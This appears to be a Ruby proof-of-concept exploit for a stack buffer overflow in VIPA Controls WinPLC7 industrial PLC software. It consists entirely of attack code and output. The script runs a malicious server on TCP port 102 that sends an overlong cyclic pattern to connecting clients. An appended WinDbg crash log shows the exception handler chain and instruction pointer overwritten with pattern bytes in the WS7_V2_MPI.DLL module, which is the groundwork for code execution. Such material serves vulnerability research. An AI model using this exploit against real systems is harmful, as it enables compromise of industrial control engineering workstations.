#!/usr/bin/env ruby
# VIPA Controls WinPLC7 Stack Buffer Overflow
#
require 'rex'
require 'socket'

buff = Rex::Text.pattern_create(2024)

server = TCPServer.new 102 

loop do
  client =  server.accept
  select(nil,nil,nil,0) 
  client.write(buff)
end
__END__
(504.fc8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=016415bf ebx=00000761 ecx=00000001 edx=7a42377a esi=01641dee edi=01641b94
eip=019c8dc6 esp=016415ac ebp=01641bbc iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203
WS7_V2_MPI!MPI6_ActivateComDrvS7SerialOnly+0x1a8a6:
019c8dc6 881a            mov     byte ptr [edx],bl          ds:0023:7a42377a=??
0:000> !exchain
01641b98: 33794232
Invalid exception stack at 79423179
0:000> g
(504.fc8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=33794232 edx=77a9660d esi=00000000 edi=00000000
eip=33794232 esp=016411c4 ebp=016411e4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
33794232 ??              ???
0:000> kv
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
016411c0 77a965f9 016412ac 01641b98 016412c8 0x33794232
016411e4 77a965cb 016412ac 01641b98 016412c8 ntdll!ExecuteHandler2+0x26
01641294 77a96457 006412ac 016412c8 016412ac ntdll!ExecuteHandler+0x24
01641294 019c8dc6 006412ac 016412c8 016412ac ntdll!KiUserExceptionDispatcher+0xf (FPO: [2,0,0]) (CONTEXT @ 016412c8)
01641bbc 357a4234 42367a42 7a42377a 397a4238 WS7_V2_MPI!MPI6_ActivateComDrvS7SerialOnly+0x1a8a6
01641bc0 42367a42 7a42377a 397a4238 43306143 0x357a4234
01641bc4 7a42377a 397a4238 43306143 61433161 0x42367a42
01641bc8 397a4238 43306143 61433161 33614332 0x7a42377a
01641bcc 43306143 61433161 33614332 43346143 0x397a4238
01641bd0 61433161 33614332 43346143 61433561 0x43306143
01641bd4 33614332 43346143 61433561 37614336 0x61433161
01641bd8 43346143 61433561 37614336 43386143 0x33614332
01641bdc 61433561 37614336 43386143 62433961 0x43346143
01641be0 37614336 43386143 62433961 31624330 0x61433561
01641be4 43386143 62433961 31624330 43326243 0x37614336
01641be8 62433961 31624330 43326243 62433362 0x43386143
01641bec 31624330 43326243 62433362 35624334 0x62433961
01641bf0 43326243 62433362 35624334 43366243 0x31624330
01641bf4 62433362 35624334 43366243 62433762 0x43326243
01641bf8 35624334 43366243 62433762 39624338 0x62433362
0:000> lmvm WS7_V2_MPI
start    end        module name
019a0000 01eed000   WS7_V2_MPI C (export symbols)       C:\Program Files\VIPA GmbH\WinPLC7 V5\WS7_V2_MPI.DLL
    Loaded symbol image file: C:\Program Files\VIPA GmbH\WinPLC7 V5\WS7_V2_MPI.DLL
    Image path: C:\Program Files\VIPA GmbH\WinPLC7 V5\WS7_V2_MPI.DLL
    Image name: WS7_V2_MPI.DLL
    Timestamp:        Mon Jun 15 05:52:51 2015 (557EBC93)
    CheckSum:         00000000
    ImageSize:        0054D000
    File version:     6.2.9.34
    Product version:  6.2.9.34
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0407.04e4
    CompanyName:      MHJ-Software GmbH & Co. KG
    ProductName:      
    InternalName:     
    OriginalFilename: ComDrvS7
    ProductVersion:   6.2.9
    FileVersion:      6.2.9.34
    FileDescription:  
    LegalCopyright:   MHJ-Software GmbH & Co. KG
    LegalTrademarks:  
    Comments:         

